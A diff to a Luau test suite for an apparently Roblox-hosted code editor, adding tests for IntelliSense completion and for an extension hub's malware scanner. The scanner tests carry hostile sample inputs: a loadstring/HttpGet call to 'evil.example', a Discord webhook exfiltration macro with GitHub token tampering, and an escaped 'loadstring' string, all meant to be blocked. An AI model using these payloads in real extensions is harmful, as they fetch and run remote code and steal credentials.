@@ -62,7 +62,7 @@ check("1. Boot dist/vsrblx.lua via loadstring(game:HttpGet(...))() with zero loa
 
 	assertEq(api.version, "1.0.0", "SDK version")
 	assertTrue(api.buildId:find("^1%.0%.0%-") ~= nil, "Deterministic FNV-1a build ID bound from __VSRBLX_BUILD")
-	assertTrue(api._env.moduleTotal == 80, "All 80 __VSRBLX_MODULES registered in lexical table")
+	assertTrue(api._env.moduleTotal == 82, "All 82 __VSRBLX_MODULES registered in lexical table")
 	assertTrue(H.sandbox.getgenv().VSRBLX == api, "Registered on getgenv().VSRBLX")
 
 	local gui = H.screen()
@@ -713,7 +713,248 @@ check("9. Combined Sprint 4 + Sprint 5: Multi-Language Live Split Preview Engine
 	mobApi.destroy()
 end)
 
-check("10. Re-execution Toggle, Locked-CoreGui PlayerGui Fallback & Dev Fallback", function()
+check("10. Finale 6A + Finale 6B: Deep LSP-Style IntelliSense Engine & Locked 5-Template Community Extension Hub", function()
+	-- =========================================================================
+	-- FINALE 6A: Deep LSP-Style IntelliSense Engine
+	-- =========================================================================
+
+	-- (1) `$0` Cursor-Stop Expansion
+	local expText, caretOff = api.intellisense.expandInsert('game:GetService("$0")')
+	assertEq(expText, 'game:GetService("")', "Cleaned $0 marker from snippet")
+	assertEq(caretOff, 17, "Placed caret right between quotes")
+
+	-- (2) `GetService("...")`, `Instance.new("...")` & `Enum.<Category>.<Item>` Completion
+	local svcSug = api.intellisense.suggest('local P = game:GetService("Tw', 30, "luau", 8)
+	assertTrue(#svcSug >= 1 and svcSug[1].label == "TweenService", "Suggested TweenService inside GetService(\"Tw")
+
+	local clsSug = api.intellisense.suggest('local b = Instance.new("TextB', 30, "luau", 8)
+	assertTrue(#clsSug >= 1 and clsSug[1].label == "TextButton", "Suggested TextButton inside Instance.new(\"TextB")
+
+	local enumSug = api.intellisense.suggest("local style = Enum.EasingStyle.Qu", 34, "luau", 8)
+	assertTrue(#enumSug >= 1 and enumSug[1].label:find("^Qu") ~= nil, "Suggested Enum.EasingStyle.Quad/Quart/Quint")
+
+	-- (3) Live DataModel Child Introspection (`workspace.` -> live child Instances + Workspace members)
+	local spawnPart = H.sandbox.Instance.new("Part", H.sandbox.workspace)
+	spawnPart.Name = "ArenaSpawnPad"
+	local liveWsSug = api.intellisense.suggest("workspace.Arena", 16, "luau", 8)
+	local foundSpawnPad = false
+	for _, it in ipairs(liveWsSug) do
+		if it.label == "ArenaSpawnPad" and it.kind == "instance" then
+			foundSpawnPad = true
+		end
+	end
+	assertTrue(foundSpawnPad, "Introspected live DataModel child `workspace.ArenaSpawnPad`!")
+
+	-- (4) Local Variable Type Inference (`Players.` vs `Players:`)
+	local typedSrc = 'local Players = game:GetService("Players")\nPlayers.'
+	local propSug = api.intellisense.suggest(typedSrc, #typedSrc + 1, "luau", 10)
+	local foundLP = false
+	for _, it in ipairs(propSug) do
+		if it.label == "LocalPlayer" then foundLP = true end
+	end
+	assertTrue(foundLP, "Inferred `Players` service type and suggested `.LocalPlayer` property")
+
+	local methSrc = 'local Players = game:GetService("Players")\nPlayers:GetP'
+	local methSug = api.intellisense.suggest(methSrc, #methSrc + 1, "luau", 10)
+	assertTrue(#methSug >= 1 and methSug[1].label == "GetPlayers", "Inferred `Players:GetPlayers()` method on `:`")
+
+	-- (5) Cross-File Workspace `require("...")` Indexing, Signature Help, Hover Docs & `F12` Go-to-Definition
+	api.writeFile("src/combat_math.luau", table.concat({
+		"local M = {}",
+		"-- Computes critical melee hit damage with armor mitigation",
+		"function M.calcDamage(baseDmg: number, critMult: number, armor: number)",
+		"\treturn math.max(1, baseDmg * critMult - armor)",
+		"end",
+		"M.DEFAULT_CRIT = 1.5",
+		"return M",
+	}, "\n"))
+
+	-- `require("...")` path autocomplete
+	local reqSug = api.intellisense.suggest('local cm = require("src/combat', 31, "luau", 8, "src/caller.luau")
+	assertTrue(#reqSug >= 1 and reqSug[1].label == "src/combat_math", "Suggested workspace module path inside require(\"...")
+
+	-- Cross-file exported member completion (`cm.`)
+	local callerDraft = 'local cm = require("src/combat_math")\ncm.'
+	local expSug = api.intellisense.suggest(callerDraft, #callerDraft + 1, "luau", 8, "src/caller.luau")
+	local foundCalc = false
+	for _, it in ipairs(expSug) do
+		if it.label == "calcDamage" then foundCalc = true end
+	end
+	assertTrue(foundCalc, "Suggested cross-file exported function `cm.calcDamage` from `src/combat_math.luau`!")
+
+	-- Parameter Signature Help (`cm.calcDamage(50, ` -> activeParam = 2!)
+	local callInProgress = 'local cm = require("src/combat_math")\nlocal d = cm.calcDamage(50, '
+	local sigInfo = api.intellisense.signatureHelp(callInProgress, #callInProgress + 1, "luau", "src/caller.luau")
+	assertTrue(sigInfo ~= nil and sigInfo.activeParam == 2, "Signature help resolved `cm.calcDamage` activeParam == 2")
+	assertTrue(sigInfo.params[2]:find("critMult") ~= nil, "Signature help identified 2nd parameter `critMult: number`")
+
+	-- Live Editor UI: SignatureHelpCard, HoverDocCard & `F12` Cross-File Go-to-Definition!
+	api.writeFile("src/caller.luau", 'local cm = require("src/combat_math")\nlocal hit = cm.calcDamage(100, 2, 15)\n')
+	local callerDoc = api.openFile("src/caller.luau", { reloadFromDisk = true })
+	local edBox = api.app.primaryEditor.box
+	edBox:CaptureFocus()
+	local calcIdx = callerDoc.content:find("calcDamage", 1, true)
+	edBox.CursorPosition = calcIdx + 3
+	api.codeStore.setCursor(callerDoc.id, calcIdx + 3, -1)
+
+	local okHov, hovInfo = api.runCommand("editor.showHover")
+	assertTrue(okHov and hovInfo ~= nil and hovInfo.doc:find("critical melee") ~= nil,
+		"Hover card extracted doc comment from cross-file `src/combat_math.luau`!")
+	assertEq(H.byName("HoverDocCard").Visible, true, "HoverDocCard visible in editor")
+
+	local okDef, defInfo = api.runCommand("editor.gotoDefinition")
+	assertTrue(okDef and defInfo ~= nil and defInfo.file == "src/combat_math.luau" and defInfo.line == 3,
+		"F12 Go-to-Definition resolved `src/combat_math.luau:3`!")
+	assertEq(api.codeStore.active("primary").path, "src/combat_math.luau",
+		"F12 opened `src/combat_math.luau` in primary editor!")
+
+	-- =========================================================================
+	-- FINALE 6B: Locked 5-Template Community Extension Hub & Malware Scanner
+	-- =========================================================================
+
+	-- (1) Verify all 5 Official Starter Packs pass the Malware & Schema Scanner
+	assertEq(#api.extensionHub.STARTER_CATALOG, 5, "All 5 allowed template starter packs present")
+	for _, starter in ipairs(api.extensionHub.STARTER_CATALOG) do
+		local sc = api.scanExtension(starter)
+		assertTrue(sc.ok == true and sc.risk == "CLEAN", "Starter pack `" .. starter.id .. "` verified CLEAN")
+	end
+
+	-- (2) Verify Malware & Schema Scanner strictly BLOCKS every attack vector & non-template issue!
+	local badTemplate = api.scanExtension({
+		id = "arbitrary-script",
+		name = "Arbitrary Runner",
+		version = "1.0.0",
+		template = "raw-luau-script",
+	})
+	assertEq(badTemplate.ok, false, "Blocked non-allowlisted 6th template (`raw-luau-script`)")
+
+	local badLoadstring = api.scanExtension({
+		id = "sneaky-snippets",
+		name = "Sneaky Snippets",
+		version = "1.0.0",
+		template = "snippet-pack",
+		snippets = {
+			{ trigger = "help", insert = 'loadstring(game:HttpGet("https://evil.example/payload.lua"))()' },
+		},
+	})
+	assertEq(badLoadstring.ok, false, "Blocked `loadstring` + `HttpGet` hidden inside snippet-pack")
+
+	local badWebhook = api.scanExtension({
+		id = "stealer-macro",
+		name = "Stealer Macro",
+		version = "1.0.0",
+		template = "command-macro",
+		macros = {
+			{
+				id = "steal",
+				title = "Exfil",
+				steps = {
+					{ op = "insertText", text = "https://discord.com/api/webhooks/12345/token" },
+					{ op = "setSetting", key = "github.pat", value = "stolen" },
+				},
+			},
+		},
+	})
+	assertEq(badWebhook.ok, false, "Blocked Discord webhook + `github.pat` tampering in command-macro")
+
+	local badEscapedBytecode = api.scanExtension({
+		id = "bytecode-pack",
+		name = "Bytecode Obfuscated",
+		version = "1.0.0",
+		template = "snippet-pack",
+		snippets = {
+			{ trigger = "obf", insert = "\\108\\111\\097\\100\\115\\116\\114\\105\\110\\103" },
+		},
+	})
+	assertEq(badEscapedBytecode.ok, false, "Blocked decimal-escaped bytecode sequence")
+
+	local badOffTopicIssue = api.scanExtension({
+		number = 42,
+		title = "pls add free blox fruits script",
+		body = "hello how do i get infinite money",
+	})
+	assertEq(badOffTopicIssue.ok, false, "Blocked off-topic non-template GitHub Issue")
+
+	-- (3) Install Verified Theme Pack, Snippet Pack, Command Macro & Toolbar Tool -> Test Live Effects!
+	local okTheme = api.installExtension(api.extensionHub.STARTER_CATALOG[1]) -- cyberpunk-neon-theme
+	assertTrue(okTheme == true, "Installed verified `theme-pack` extension")
+	api.setTheme("ext_cyberpunk_neon_theme")
+	assertEq(api.theme.color.accent:ToHex(), "00f0ff", "Applied custom Cyberpunk Neon theme accent `#00f0ff`")
+
+	local okSnip = api.installExtension(api.extensionHub.STARTER_CATALOG[2]) -- roblox-net-combat-snippets
+	assertTrue(okSnip == true, "Installed verified `snippet-pack` extension")
+	local extSnipSug = api.intellisense.suggest("remf", 5, "luau", 8)
+	assertTrue(#extSnipSug >= 1 and extSnipSug[1].label == "remfire", "Installed snippet-pack registered `remfire` trigger in LSP!")
+
+	local okMacro = api.installExtension(api.extensionHub.STARTER_CATALOG[3]) -- luau-header-service-macros
+	assertTrue(okMacro == true, "Installed verified `command-macro` extension")
+
+	local okTool = api.installExtension(api.extensionHub.STARTER_CATALOG[5]) -- luau-buffer-power-tools
+	assertTrue(okTool == true, "Installed verified `toolbar-tool` extension")
+	api.writeFile("src/unsorted.txt", "zebra\nalpha\nmango")
+	local sortDoc = api.openFile("src/unsorted.txt", { reloadFromDisk = true })
+	api.runCommand("ext.luau-buffer-power-tools.sortLines")
+	assertEq(sortDoc.content, "alpha\nmango\nzebra", "Installed `toolbar-tool` sorted buffer lines declaratively!")
+
+	-- (4) Live GitHub Issues Hub Sync: 1 Valid Community Issue (#101) + 1 Malicious Issue (#102)
+	local validIssueMd = api.extensionHub.generateIssueMarkdown({
+		id = "emerald-matrix-theme",
+		name = "Emerald Matrix Dark",
+		version = "1.2.0",
+		author = "luau-artist",
+		summary = "Phosphor green terminal theme.",
+		template = "theme-pack",
+		theme = {
+			isLight = false,
+			colors = { editor = "#050d07", accent = "#00ff66" },
+			syntax = { keyword = "#00ff66" },
+		},
+	})
+	local maliciousIssueMd = validIssueMd:gsub("Phosphor green terminal theme%.", "https://discord.com/api/webhooks/999/steal")
+
+	H.onHttp(function(_req, url)
+		if url == RAW_URL then
+			return { StatusCode = 200, Body = bundleSource }
+		elseif url:find("/repos/TheStrongestOfTomorrow/VS%-RBLX/issues") then
+			return {
+				StatusCode = 200,
+				Body = json.encode({
+					{
+						number = 101,
+						title = "[EXT] Emerald Matrix Dark",
+						user = { login = "luau-artist" },
+						comments = 4,
+						body = validIssueMd,
+					},
+					{
+						number = 102,
+						title = "[EXT] Totally Safe Pack",
+						user = { login = "bad-actor" },
+						comments = 0,
+						body = maliciousIssueMd,
+					},
+				}),
+			}
+		end
+	end)
+
+	api.runCommand("workbench.viewExtensions")
+	local synced = api.syncExtensions("TheStrongestOfTomorrow/VS-RBLX")
+	assertEq(#synced, 2, "Fetched 2 open GitHub Issue submissions")
+	assertEq(synced[1].scan.ok, true, "Issue #101 (`emerald-matrix-theme`) verified CLEAN by client scanner")
+	assertEq(synced[2].scan.ok, false, "Issue #102 (webhook exfil) BLOCKED by client scanner")
+	assertEq(H.byName("ExtScanBadge_emerald-matrix-theme").Text, "🛡 CLEAN", "UI rendered `🛡 CLEAN` badge on #101")
+
+	-- Attempting to install blocked Issue #102 fails closed!
+	local okEvilInstall = api.installExtension(synced[2].manifest or maliciousIssueMd)
+	assertEq(okEvilInstall, false, "Client refused to install blocked Issue #102")
+
+	-- Clean uninstall restores default theme & removes extension commands
+	assertTrue(api.uninstallExtension("cyberpunk-neon-theme") == true, "Uninstalled cyberpunk-neon-theme cleanly")
+	assertEq(api.theme.activeId, "dark_plus", "Reverted active theme to `dark_plus` on uninstall")
+end)
+
+check("11. Re-execution Toggle, Locked-CoreGui PlayerGui Fallback & Dev Fallback", function()
 	-- Re-running the same build toggles visibility and returns existing handle
 	local secondChunk = assert(H.sandbox.loadstring(
 		'return loadstring(game:HttpGet("' .. RAW_URL .. '"))()',
